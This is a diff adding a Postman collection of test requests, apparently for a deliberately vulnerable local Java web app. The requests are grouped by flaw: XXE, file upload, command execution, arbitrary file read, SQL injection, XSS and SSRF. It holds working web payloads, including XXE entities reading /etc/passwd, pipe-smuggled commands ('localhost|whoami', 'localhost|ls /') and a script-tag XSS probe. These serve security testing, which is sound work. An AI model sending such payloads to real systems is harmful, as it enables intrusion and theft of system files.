@@ -1,0 +1,317 @@
+{
+	"info": {
+		"_postman_id": "2a76bba3-1ab2-4768-a63c-e4d5f122d970",
+		"name": "java",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "xxe",
+			"item": [
+				{
+					"name": "xxe回显",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE note [   <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<id>&xxe;</id>",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://127.0.0.1:8080/xxe/dom4j",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"xxe",
+								"dom4j"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "xxe不回显",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE note [   <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<body>\n<id>1</id>\n<xxe>&xxe;</xxe>\n</body>\n",
+							"options": {
+								"raw": {
+									"language": "xml"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://127.0.0.1:8080/xxe/jdom",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"xxe",
+								"jdom"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "文件上传",
+			"item": [
+				{
+					"name": "http://127.0.0.1:8080/fileupload/multipart",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "file",
+									"type": "file",
+									"src": "/Users/jeffery.yu/Desktop/404.jsp"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://127.0.0.1:8080/fileupload/multipart",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"fileupload",
+								"multipart"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "命令执行",
+			"item": [
+				{
+					"name": "Runtime",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "ip",
+									"value": "localhost|ls /",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://localhost:8080/cmd/runtime",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "8080",
+							"path": [
+								"cmd",
+								"runtime"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "processbuild",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "ip",
+									"value": "localhost|whoami",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://localhost:8080/cmd/processbuild",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "8080",
+							"path": [
+								"cmd",
+								"processbuild"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "任意文件",
+			"item": [
+				{
+					"name": "ReadAction",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://127.0.0.1:8080/fileread/read?file=1.txt",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"fileread",
+								"read"
+							],
+							"query": [
+								{
+									"key": "file",
+									"value": "1.txt"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "SQL注入",
+			"item": [
+				{
+					"name": "Jdbc",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://127.0.0.1:8080/sqlinject/jdbc?id=1",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"sqlinject",
+								"jdbc"
+							],
+							"query": [
+								{
+									"key": "id",
+									"value": "1"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "XSS",
+			"item": [
+				{
+					"name": "reflex",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://127.0.0.1:8080/xss/reflex?title=六月的雨<script>alert(123)</script>",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"xss",
+								"reflex"
+							],
+							"query": [
+								{
+									"key": "title",
+									"value": "六月的雨<script>alert(123)</script>"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "SSRF",
+			"item": [
+				{
+					"name": "ssrf",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://127.0.0.1:8080/ssrf/okhttp?url=http://www.baidu.com/img/baidu.svg",
+							"protocol": "http",
+							"host": [
+								"127",
+								"0",
+								"0",
+								"1"
+							],
+							"port": "8080",
+							"path": [
+								"ssrf",
+								"okhttp"
+							],
+							"query": [
+								{
+									"key": "url",
+									"value": "http://www.baidu.com/img/baidu.svg"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		}
+	]
+}
